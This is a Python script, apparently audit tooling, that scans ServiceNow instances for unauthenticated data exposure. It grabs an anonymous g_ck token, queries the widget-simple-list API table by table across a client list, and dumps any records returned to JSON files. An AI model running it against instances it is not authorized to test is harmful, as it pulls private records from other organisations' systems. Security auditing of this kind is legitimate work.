#!/usr/bin/python

import requests
import pandas as pd
import re
import json
import sys
import time
from datetime import datetime

__title__ = 'ServiceNow Widget Vulnerability Scan'
__license__ = 'MIT'

#ToDo: set on client.csv the column if is secure or not if something is found

#****************************************************************************************************************
#CAPTURA G_CK
#****************************************************************************************************************
def getCK(InstanceName):
    url = "https://"+InstanceName+".service-now.com/login.do"

    payload = {}
    headers = {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
    }

    response1 = requests.request("GET", url, headers=headers, data=payload)
    
    global cookie
    cookie = response1.cookies
    html_content = response1.content.decode('utf-8')

    # Find the script tag containing the variable definition
    pattern = r"var\s+g_ck\s*=\s*'([^']+)';"
    match = re.search(pattern, html_content)
    #print(match)
    # Extract the value of g_ck
    if match:
        g_ck_value = match.group(1).replace(" ",'')
        print("     g_ck: ", g_ck_value)
    else:
        print("     g_ck not found in the HTML")
        
    return g_ck_value

#****************************************************************************************************************
#CAPTURES TEST RESULTS IN EACH TABLE
#****************************************************************************************************************

def callHTTP(InstanceName, g_ck_value, table_name, fieldTest=False):

    api_url = "https://"+InstanceName+".service-now.com/api/now/sp/widget/widget-simple-list"

    payload = {}
    headers = {
        'X-UserToken': g_ck_value,
        'Content-Type': 'application/json',
        'Accept': 'application/json',
            }
    
    if "field" in sys.argv[1:] and fieldTest != False:
        url = api_url + f"?t={table_name}&f={fieldTest}"
    else:
        url = api_url + f"?t={table_name}"
    print("     URL: ",url)
    #print("HEADER: ", headers)
    
    response = requests.request("POST",url, headers=headers, data=payload, cookies=cookie)
    
    return response.json()['result']['data']
        


#****************************************************************************************************************
#CALLS RESULTS CAPTURE METHOD AND PRINTS SUMMARY
#****************************************************************************************************************
def getResults(InstanceName,table_name, g_ck_value, fieldTest=False):

    result = callHTTP(InstanceName, g_ck_value, table_name, fieldTest)
    
    if result['isValid'] == True:
        print("     Valid: ",result['isValid'],"; Record Count: ",len(result['list']))
       
       # Gera Json com os dados retornados
        if len(result['list']) > 0:
            if "json" in sys.argv[1:]:
                print("     Creating JSON File")
                with open(InstanceName+"_"+table_name+".json", 'w') as json_file:
                    json.dump(result, json_file)
                
    else:
        print("     Valid: ",result['isValid'])
        
    return result


#****************************************************************************************************************
# MAIN
# WITHOUT ARGUMENTS = Scans CSV clients and sys_db_object
#
# ARG 1 = CLIENT
# ARG 2 = Keyword 'table' Specifies table
# ARG 3 = TABLE NAME
# ARG 4 = Keyword 'json' to generate file if there are records
# ARG 5 = Keyword 'field <field name>' to specify if there will be a field test
#****************************************************************************************************************
def main():

    currentDatetime = datetime.now()
    formattedDatetime = currentDatetime.strftime("%d%m%Y_%H%M")
    
    if len(sys.argv)>1:
        InstanceName = sys.argv[1]
        print("Scanning host: {}".format(str(InstanceName)))
    
        #Indica se quer varrer tabela espec√≠fica
        if "table" in sys.argv[1:]:
            specificTable = sys.argv[3]
            print("Scanning specific Table: {}".format(str(specificTable)))
            table_name = specificTable
            
            #Captura G_CK
            g_ck_value = getCK(InstanceName)
            
            if g_ck_value:
                if "field" in sys.argv[1:]:
                    fieldTest = sys.argv[6]
                    print("     Testing specific field")
                    getResults(InstanceName,table_name,g_ck_value,fieldTest)
                else:
                    getResults(InstanceName,table_name,g_ck_value)
            else:
                sys.exit("Fail to get g_ck")
                
            
        else:
            print("Missing arguments when using specific hosts.")
            print("")
            print("To Scan a list of hosts: 'python3 sn_leak_check.py'")
            print("To Scan Specific Host, Table and generate json: 'python3 sn_leak_check.py <instance_name> table <Table_name> <json>' ")
            print("To Scan Specific Host, Table and specific Field: 'python3 sn_leak_check.py <instance_name> table <Table_name> json field <field_name>' ")
            print("")
    else:
        try:
            dClients = pd.read_csv("clients.csv", encoding='ISO-8859-1')
        except FileNotFoundError:
            sys.exit("The file clients.csv does not exist.")
            
        for indexC, rowC in dClients.iterrows():
            InstanceName = rowC['name']
            secure = rowC['is_secure']
            
            print("Scanning host: ", InstanceName)
            
            #Gera novo arquivo por cliente
            try:
                fileSource = pd.read_csv("sys_db_object.csv", encoding='ISO-8859-1')
            except FileNotFoundError:
                sys.exit("The file sys_db_object.csv does not exist.")
            
            destinationFile = f"Scan_{InstanceName}_{formattedDatetime}.csv"
            fileSource.to_csv(destinationFile, index=False)
            time.sleep(3)
        
            dTables = pd.read_csv(destinationFile, encoding='ISO-8859-1')
            
            for index, row in dTables.iterrows():
                table_name = row['name']
                processed = row['processed']
                column = row['col']
                
                print("Table: ",table_name)
            
                #Captura G_CK
                g_ck_value = getCK(InstanceName)
            
                if g_ck_value and processed != True:
                    if "field" in sys.argv[1:]:
                        fieldTest = sys.argv[6]
                        print("     Testing specific field")
                        result = getResults(InstanceName,table_name,g_ck_value,column)
                    else:
                        result = getResults(InstanceName,table_name,g_ck_value)
                        
                    dTables.at[index, 'isValid'] = result['isValid']
                    
                    if result['isValid'] == True:
                        dTables.at[index, 'listCount'] = len(result['list'])
                    
                        if(len(result['list']) > 0):
                            dTables.at[index, 'result'] = True
                        else:
                            dTables.at[index, 'result'] = False
                    else:
                        dTables.at[index, 'listCount'] = 0
                        dTables.at[index, 'result'] = False
                    
                    dTables.at[index, 'processed'] = True
                    dTables.to_csv(destinationFile, index=False)
                    
                else:
                    sys.exit("Fail to get g_ck")
            
                    
if __name__ == "__main__":
        main()
